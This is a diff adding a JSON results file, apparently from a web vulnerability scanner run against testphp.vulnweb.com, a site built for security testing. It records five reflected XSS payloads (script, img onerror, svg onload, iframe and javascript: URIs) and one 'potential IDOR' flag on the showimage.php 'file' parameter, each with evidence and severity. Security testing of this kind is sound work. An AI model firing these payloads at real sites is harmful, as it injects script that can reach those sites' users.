@@ -1,0 +1,50 @@
+[
+    {
+        "url": "http://testphp.vulnweb.com/showimage.php?file=<script>alert(1)</script>",
+        "payload": "<script>alert(1)</script>",
+        "type": "XSS",
+        "description": "Reflected XSS vulnerability detected.",
+        "evidence": "Payload '<script>alert(1)</script>' was reflected in the response.",
+        "severity": "Medium"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/showimage.php?file=<img src=x onerror=alert(1)>",
+        "payload": "<img src=x onerror=alert(1)>",
+        "type": "XSS",
+        "description": "Reflected XSS vulnerability detected.",
+        "evidence": "Payload '<img src=x onerror=alert(1)>' was reflected in the response.",
+        "severity": "Medium"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/showimage.php?file=<svg/onload=alert(1)>",
+        "payload": "<svg/onload=alert(1)>",
+        "type": "XSS",
+        "description": "Reflected XSS vulnerability detected.",
+        "evidence": "Payload '<svg/onload=alert(1)>' was reflected in the response.",
+        "severity": "Medium"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/showimage.php?file=javascript:alert(1)",
+        "payload": "javascript:alert(1)",
+        "type": "XSS",
+        "description": "Reflected XSS vulnerability detected.",
+        "evidence": "Payload 'javascript:alert(1)' was reflected in the response.",
+        "severity": "Medium"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/showimage.php?file=<iframe src=javascript:alert(1)>",
+        "payload": "<iframe src=javascript:alert(1)>",
+        "type": "XSS",
+        "description": "Reflected XSS vulnerability detected.",
+        "evidence": "Payload '<iframe src=javascript:alert(1)>' was reflected in the response.",
+        "severity": "Medium"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/showimage.php?file=",
+        "payload": "Indicator: file",
+        "type": "IDOR (Potential)",
+        "description": "Potential IDOR vulnerability detected based on URL parameter/path.",
+        "evidence": "URL contains common ID indicator 'file'. Manual verification required.",
+        "severity": "Medium"
+    }
+]
